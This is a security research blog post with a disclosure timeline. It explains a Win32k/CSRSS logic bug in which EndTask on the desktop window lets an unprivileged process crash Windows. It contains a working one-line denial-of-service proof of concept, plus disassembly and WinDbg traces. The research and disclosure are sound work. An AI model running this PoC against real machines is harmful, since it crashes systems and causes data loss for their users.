<!doctype html><html lang=en><head><meta charset=utf-8><meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name=viewport><meta content=BlahCats name=author><meta content="Tales of a binary encoded life..." name=description><meta prefix="og: http://ogp.me/ns#" content=BlahCats property=og:site_name><meta prefix="og: http://ogp.me/ns#" content=blog property=og:type><meta content="An unexpected logic bug on Win32k" prefix="og: http://ogp.me/ns#" property=og:title><meta content="An unexpected logic bug on Win32k - by hugsy" prefix="og: http://ogp.me/ns#" property=og:description><meta prefix="og: http://ogp.me/ns#" content=en_US property=og:locale><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/2020-03-09-unexpected-logic-bug-win32k property=og:url><meta prefix="og: http://ogp.me/ns#" content=https://blahcat.github.io/img/CDA9D98DF912DE08CB61AD0A3A148723A37BC3F3.png property=og:image><meta content=summary_large_image name=twitter:card><meta content=@ctf_blahcat name=twitter:site><meta content=BlahCats name=twitter:title><meta content="An unexpected logic bug on Win32k - by hugsy" name=twitter:description><meta content=https://blahcat.github.io/2020-03-09-unexpected-logic-bug-win32k name=twitter:url><meta content=https://blahcat.github.io/img/CDA9D98DF912DE08CB61AD0A3A148723A37BC3F3.png name=twitter:image:src><script type=application/ld+json>
    {
      "@context" : "http://schema.org",
      "@type" : "Website",
      "name": " BlahCats",
      "url" : "https://blahcat.github.io/2020-03-09-unexpected-logic-bug-win32k",
      
      "image": https://blahcat.github.io/img/CDA9D98DF912DE08CB61AD0A3A148723A37BC3F3.png",
      
      
      "description": An unexpected logic bug on Win32k - by hugsy",
      
    }
    </script><title>
  An unexpected logic bug on Win32k
</title><link href=https://blahcat.github.io/img/favicon.ico rel=icon type=image/x-icon><link href=https://blahcat.github.io/css/bootstrap.min.css rel=stylesheet><link href=" https://blahcat.github.io/css/all.min.css" rel=" stylesheet"><link href="https://fonts.googleapis.com/css?family=Roboto" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Montserrat:400,300" rel=stylesheet><link href="https://fonts.googleapis.com/css?family=Lato" -- <!-- custom for rel=stylesheet styles template this><link href=https://blahcat.github.io/css/clean-blog.css rel=stylesheet><link href=https://blahcat.github.io/css/overrides.css rel=stylesheet><link integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css referrerpolicy=no-referrer rel=stylesheet><body><nav class="navbar navbar-expand-lg navbar-light fixed-top" id=mainNav><div class=container><a class=navbar-brand href=https://blahcat.github.io>BlahCats Blog</a><button aria-label="Toggle navigation" class="navbar-toggler navbar-toggler-right" aria-controls=navbarResponsive aria-expanded=false data-target=#navbarResponsive data-toggle=collapse type=button>Menu <i class="fas fa-bars"></i></button><div class="collapse navbar-collapse" id=navbarResponsive><ul class="navbar-nav ml-auto"><li class=nav-item><a class=nav-link href=https://blahcat.github.io>Home</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/series>Series</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/notes>Notes</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/about>About</a><li class=nav-item><a class=nav-link href=https://blahcat.github.io/qemu>Qemu VMs</a></ul></div></div></nav><header class=masthead style=background-image:url(https://blahcat.github.io/img/CDA9D98DF912DE08CB61AD0A3A148723A37BC3F3.png)><div class=overlay></div><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><div class=post-heading><h1>An unexpected logic bug on Win32k</h1><span class=meta> <b> • <a href=/author/hugsy>hugsy</a> • </b> 9 March 2020 <br> <br> <i>Reading time: 5 min</i> </span></div></div></div></div></header><article><article class=post><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><h2 id=the-short-version>The short version</h2><p>The short version is that there’s a small logic bug in <code>user32!EndTask()</code> which doesn’t really check the <code>HWND</code> handle passed when forcefully killing the process, allowing unprivileged process to BSoD the host by killing the critical process <code>csrss</code>. And as a bonus the PoC code #FitsInATweet:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#b48ead>int </span><span style=color:#8fa1b3>WinMain</span><span>(HINSTANCE </span><span style=color:#bf616a>h</span><span>, HINSTANCE </span><span style=color:#bf616a>ins</span><span>, LPSTR </span><span style=color:#bf616a>cmd</span><span>, </span><span style=color:#b48ead>int </span><span style=color:#bf616a>nb</span><span>)
</span><span>{
</span><span>    </span><span style=color:#bf616a>EndTask</span><span>(</span><span style=color:#bf616a>GetDesktopWindow</span><span>(), </span><span style=color:#d08770>0</span><span>, </span><span style=color:#d08770>1</span><span>);
</span><span>    </span><span style=color:#b48ead>return </span><span style=color:#d08770>0</span><span>;
</span><span>}
</span></code></pre><p>Just compile, run (here on a build 19569.1000 x64) and enjoy:</p><a href=https://i.imgur.com/DRxULeh.png target=_blank> <img alt=bsod src=https://i.imgur.com/DRxULeh.png title=bsod width=100%> </a><h2 id=the-less-short-version>The less short version</h2><p>Reversing <code>Win32k.sys</code> driver has been my hobby lately mostly to understand it (finally) seriously - if there is such a thing. This is a really small funny logic bug I encountered while reversing it, which I don’t feel too bad disclosing since there is <a rel="noopener nofollow noreferrer" href=https://www.microsoft.com/en-us/msrc/windows-security-servicing-criteria target=_blank>no security exploitability</a> (simply annoying your sysadmin).<h3 id=the-juicy-part>The juicy part</h3><p>The legacy function <a rel="noopener nofollow noreferrer" href=https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-endtask target=_blank>EndTask</a> can be used to forcefully close the specific window whose handle is passed as argument, and free all associated resources. Although deprecated according to the MSDN, it is still callable even on the latest Windows versions.<p>The function <code>user32!EndTask()</code> is merely a wrapper designed to forward some specific messages to the <a rel="noopener nofollow noreferrer" href=https://en.wikipedia.org/wiki/Client/Server_Runtime_Subsystem target=_blank>CSRSS</a> via an ALPC, using the exported function <code>ntdll!CsrClientCallServer</code> with the ApiNumber 0x30401. Easily enough, the function takes the handle to the window to shut down. The function operates with the thread’s token, and is unprivileged. Starting playing around, I remembered that <code>GetDesktopWindow()</code> will return a valid handle to the desktop window, but has <a href="https://devblogs.microsoft.com/oldnewthing/20040224-00/?p=40493" rel="noopener nofollow noreferrer" target=_blank>many interesting properties</a> including that that it is owned by <code>csrss.exe</code>. That can be quickly demonstrated using the following code:<pre class=language-c data-lang=c style=color:#c0c5ce;background-color:#2b303b><code class=language-c data-lang=c><span style=color:#b48ead>int </span><span>WINAPI </span><span style=color:#8fa1b3>WinMain</span><span>(HINSTANCE </span><span style=color:#bf616a>hInstance</span><span>, HINSTANCE </span><span style=color:#bf616a>hPrevInstance</span><span>, LPSTR </span><span style=color:#bf616a>lpCmdLine</span><span>, </span><span style=color:#b48ead>int </span><span style=color:#bf616a>nCmdShow</span><span>)
</span><span>{
</span><span>    </span><span style=color:#b48ead>char</span><span> msg[</span><span style=color:#d08770>1024</span><span>]={</span><span style=color:#d08770>0</span><span>,};
</span><span>    HWND hwnd = </span><span style=color:#bf616a>GetDesktopWindow</span><span>();
</span><span>    DWORD dwProcessId;
</span><span>    </span><span style=color:#bf616a>GetWindowThreadProcessId</span><span>(hwnd, &dwProcessId);
</span><span>    </span><span style=color:#96b5b4>sprintf</span><span>(msg, "</span><span style=color:#a3be8c>hwnd=</span><span style=color:#d08770>%p</span><span style=color:#a3be8c> pid=</span><span style=color:#d08770>%lu</span><span style=color:#96b5b4>\n</span><span>", hwnd, dwProcessId);
</span><span>    </span><span style=color:#bf616a>MessageBoxA</span><span>(</span><span style=color:#d08770>0</span><span>,msg,</span><span style=color:#d08770>0</span><span>,MB_OK);
</span><span>    </span><span style=color:#b48ead>return </span><span style=color:#d08770>0</span><span>;
</span><span>}
</span></code></pre><p>which will output the PID of CSRSS</p><a href=https://i.imgur.com/Q4XsJZP.png target=_blank> <img alt=finding_csrss src=https://i.imgur.com/Q4XsJZP.png title=finding_csrss width=100%> </a><p>In turn, CSRSS will consume that message and call <code>winsrvext!SrvEndTask()</code> then <code>winsrvext!EndTask()</code>. In this function, in order to determine the process to terminate <code>csrss</code> will invoke <code>GetWindowThreadProcessId()</code> and will use the found process id value to look into the <a rel="noopener nofollow noreferrer" href=http://www.geoffchappell.com/studies/windows/win32/csrsrv/api/process/process.htm target=_blank><code>CSR_PROCESS</code></a> linked list (via <code>csrsrv!CsrRootProcess</code>), and find the <code>CSR_PROCESS</code> structure associated to such PID. From <code>winsrvext.dll</code>:<pre class=language-asm data-lang=asm style=color:#c0c5ce;background-color:#2b303b><code class=language-asm data-lang=asm><span style=color:#8fa1b3>_EndTask</span><span style=color:#65737e>      ; NTSTATUS __fastcall EndTask(HWND hWnd, int a2)
</span><span style=color:#8fa1b3>_EndTask      _EndTask        proc near</span><span style=color:#65737e>               ; CODE XREF: SrvEndTask+119↓p
</span><span style=color:#8fa1b3>_EndTask</span><span style=color:#65737e>                                              ; DATA XREF: .pdata:000000000001D21C↓o
</span><span style=color:#96b5b4>[...]
</span><span style=color:#8fa1b3>_EndTask</span><span>+</span><span style=color:#8fa1b3>A7                   </span><span style=color:#b48ead>lea     </span><span style=color:#bf616a>rdx</span><span>, [</span><span style=color:#bf616a>rsp</span><span>+</span><span style=color:#d08770>120h</span><span>+</span><span style=color:#8fa1b3>dwProcessId</span><span>]</span><span style=color:#65737e> ; lpdwProcessId
</span><span style=color:#8fa1b3>_EndTask</span><span>+</span><span style=color:#8fa1b3>AC                   </span><span style=color:#b48ead>mov     </span><span style=color:#bf616a>rcx</span><span>, </span><span style=color:#bf616a>rdi</span><span style=color:#65737e>        ; hWnd
</span><span style=color:#8fa1b3>_EndTask</span><span>+</span><span style=color:#8fa1b3>AF                   </span><span style=color:#b48ead>call    </span><span style=color:#bf616a>cs</span><span style=color:#8fa1b3>:__imp_GetWindowThreadProcessId
</span></code></pre><h3 id=the-bug>The bug</h3><p>And therein lied the bug: as shown above with the small C snippet, the owner of <code>GetDesktopWindow()</code> is <code>csrss</code> itself, therefore the lookup will return the <code>CSR_PROCESS</code> structure of <code>CSRSS</code> (which happens to be the first entry in the <code>CsrRootProcess</code> linked list). Finally, <code>winsrvext!EndTask()</code> will proceed to call <code>ntdll!NtTerminateProcess()</code> passing the handle to the process <code>CSRSS</code>, which has the value <code>(HANDLE)-1</code> (i.e. <code>GetCurrentProcess()</code>). WinDbg can be used to confirm that behavior:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>0: kd> dps poi( csrsrv!CsrRootProcess )
</span><span>00000218`7d004550  00000000`00000c14 &LT- CSR_PROCESS.ClientId
</span><span>00000218`7d004558  00000000`00000c18
</span><span>00000218`7d004560  00000218`7d008bf0 &LT- CSR_PROCESS.LinkList
</span><span>00000218`7d004568  00000218`7d04b3a0 &LT- CSR_PROCESS.ThreadList
</span><span>00000218`7d004570  00000218`7d005368 [...]
</span><span>00000218`7d004578  00000218`7d0486b8
</span><span>00000218`7d004580  00000000`00000000
</span><span>00000218`7d004588  00000000`00000000
</span><span>00000218`7d004590  00000000`00000000
</span><span>00000218`7d004598  00000000`00000000
</span><span>00000218`7d0045a0  ffffffff`ffffffff <&LT- CSR_PROCESS.ProcessHandle (i.e. value passed to NtTerminateProcess)
</span><span>00000218`7d0045a8  00000040`00000005
</span><span>[...]
</span></code></pre><p>Therefore, this will make <code>CSRSS</code> killing itself when invoking calling the syscall <code>nt!NtTerminateProcess(GetCurrentProcess(), 0 )</code>. As a critical process, killing CSRSS will immediately result in a BSoD, which BugCheck clearly shows. Also note that this crash can be triggered by any user even with any privilege. In WinDbg the faulting stack trace of our BSoD retraces exactly everything we show:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>CRITICAL_PROCESS_DIED (ef)
</span><span>        A critical system process died
</span><span>[...]
</span><span>Arguments:
</span><span>Arg1: ffffe30f47ce14c0, Process object or thread object
</span><span>Arg2: 0000000000000000, If this is 0, a process died. If this is 1, a thread died.
</span><span>[...]
</span><span>
</span><span>STACK_TEXT:
</span><span>ffff8803`2a71f280 fffff801`795c75c1 : [...] : nt!PspCatchCriticalBreak+0xa9
</span><span>ffff8803`2a71f320 fffff801`79439fc0 : [...] : nt!PspTerminateAllThreads+0x175e3d
</span><span>ffff8803`2a71f390 fffff801`79439da9 : [...] : nt!PspTerminateProcess+0xe0
</span><span>ffff8803`2a71f3d0 fffff801`78fd2d15 : [...] : nt!NtTerminateProcess+0xa9
</span><span>ffff8803`2a71f440 00007ff9`83b5c644 : [...] : nt!KiSystemServiceCopyEnd+0x25
</span><span>000000b6`d35befd8 00007ff9`809066e5 : [...] : ntdll!NtTerminateProcess+0x14
</span><span>000000b6`d35befe0 00007ff9`80906bae : [...] : winsrvext!EndTask+0x235
</span><span>000000b6`d35bf110 00007ff9`80975af4 : [...] : winsrvext!SrvEndTask+0x11e
</span><span>000000b6`d35bf380 00007ff9`83b2cedf : [...] : CSRSRV!CsrApiRequestThread+0x484
</span><span>000000b6`d35bf810 00000000`00000000 : [...] : ntdll!RtlUserThreadStart+0x2f
</span></code></pre><h2 id=final-words>Final words</h2><p>This was a good lesson, mostly because I would never have thought finding a (cheap) logic bug in an API that is around for decades and probably gleaned at many times by people way smarter.<p>Also, I’ve reported more Win32k bugs to MS which I’ll be writing up on soon.<p>That’s all for this quick post!<p>✌<h2 id=disclosure-timeline>Disclosure timeline</h2><ul><li>2019-12-09 : Bug found<li>2020-02-08 : Finally found some time to do some analysis<li>2020-02-09 : Issue submitted to MSRC (case 56511)<li>2020-03-04 : EWONTFIX</ul><aside class=post-tags><p>Categories: <a href=https://blahcat.github.io/categories/research/>#research</a><p>Tags: <a href=https://blahcat.github.io/tags/windows/>#windows</a> <a href=https://blahcat.github.io/tags/kernel/>#kernel</a> <a href=https://blahcat.github.io/tags/logic/>#logic</a> <a href=https://blahcat.github.io/tags/bug-win32k/>#bug,win32k</a></aside><aside class=post-discussion>Join the Discussion on <a href="https://github.com/blahcat/blahcat.github.io/discussions?discussions_q=An unexpected logic bug on Win32k" target=_blank> <i class="fab fa-github fa-lg"></i> GitHub </a></aside><aside class=post-nav><div class=container><div class=row><div class=col><b>Next:</b><br><a class=post-nav-prev href=https://blahcat.github.io/2020-05-23-enumerating-process-from-kd/> <section class=post-nav-teaser><b class=post-nav-title>Enumerating processes from KD</b><p class=post-nav-excerpt>This is tiny Post-It post to remind of different ways to enumerate processe…</section> </a></div><div class=col><b>Previous:</b><br><a class=post-nav-next href=https://blahcat.github.io/2019-03-17-small-dumps-in-the-big-pool/> <section class=post-nav-teaser><b class=post-nav-title>Small dumps in the big pool</b><p class=post-nav-excerpt>Or, on how to use the (Windows 10) new field _ETHREAD.ThreadName to stabili…</section> </a></div></div></div></aside></div></div><hr><footer><div class=container><div class=row><div class="col-lg-8 col-md-10 mx-auto"><ul class="list-inline text-center"><li class=list-inline-item><a href=https://blahcat.github.io/atom.xml> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fas fa-rss fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://twitter.com/ctf_blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-twitter fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://github.com/blahcat> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-github fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://www.youtube.com/channel/UCDrgY65mRZWVoMiB5-VMqfg> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-youtube fa-stack-1x fa-inverse"></i> </span> </a><li class=list-inline-item><a href=https://discord.gg/hSbqxxBgRX> <span class="fa-stack fa-lg"> <i class="fas fa-circle fa-stack-2x"></i> <i class="fab fa-discord fa-stack-1x fa-inverse"></i> </span> </a></ul><p class="copyright text-muted">Made with ❤ with Zola</div></div></div></footer><script src=https://blahcat.github.io/js/jquery.min.js></script><script src=https://blahcat.github.io/js/bootstrap.bundle.min.js></script><script src=https://blahcat.github.io/js/clean-blog.min.js></script><script src=//cdnjs.cloudflare.com/ajax/libs/mermaid/9.1.1/mermaid.min.js></script><div class=mermaidTooltip style=opacity:0></div>